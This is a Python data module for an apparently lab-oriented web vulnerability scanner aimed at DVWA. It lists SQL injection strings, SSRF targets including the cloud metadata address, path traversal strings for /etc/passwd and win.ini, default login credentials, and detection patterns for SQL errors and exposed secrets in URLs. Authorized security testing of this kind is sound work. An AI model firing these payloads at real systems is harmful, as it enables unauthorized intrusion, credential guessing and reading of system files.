"""Non-destructive payloads and patterns for authorized lab scanning."""

from __future__ import annotations

# (label, payload) — read-only SQL error / boolean probes; no DROP or data destruction.
SQLI_APPROACHES: list[tuple[str, str]] = [
    ("classic_or", "' OR '1'='1"),
    ("classic_or_hash", "' OR 1=1#"),
    ("comment_double_dash", "' OR 1=1-- "),
    ("inline_comment_space", "'/**/OR/**/1=1--"),
    ("case_obfuscation", "' Or '1'='1"),
    ("double_quote_or", '" OR "1"="1'),
    ("parenthesis_wrap", "') OR ('1'='1"),
    ("boolean_tautology", "' AND '1'='1"),
    ("union_null_probe", "' UNION SELECT NULL#"),
    ("union_dual_null", "' UNION SELECT NULL,NULL#"),
    ("numeric_truth", "1 OR 1=1"),
    ("tick_escape", "1' OR '1'='1"),
]

SSRF_SAFE_PAYLOADS = [
    "http://127.0.0.1",
    "http://169.254.169.254",
    "http://127.0.0.1:80",
    "http://localhost",
]

TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "....//....//etc/passwd",
]

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "password123"),
    ("gordonb", "abc123"),
    ("test", "test"),
]

# DVWA default after setup is often admin / password — tried early via ordering in auth scanner.

SQL_ERROR_PATTERNS = [
    "mysql_fetch",
    "mysqli_",
    "mysqli_sql_exception",
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "syntax error",
    "sqlstate",
    "ora-",
    "sqlite",
    "postgresql",
    "pg_query",
    "syntax error at or near",
    "supplied argument is not a valid mysql",
    "different number of columns",
    "unknown column",
    "mysql server version",
]

SENSITIVE_URL_PATTERNS = [
    "password=",
    "token=",
    "apikey=",
    "card=",
    "cvv=",
]
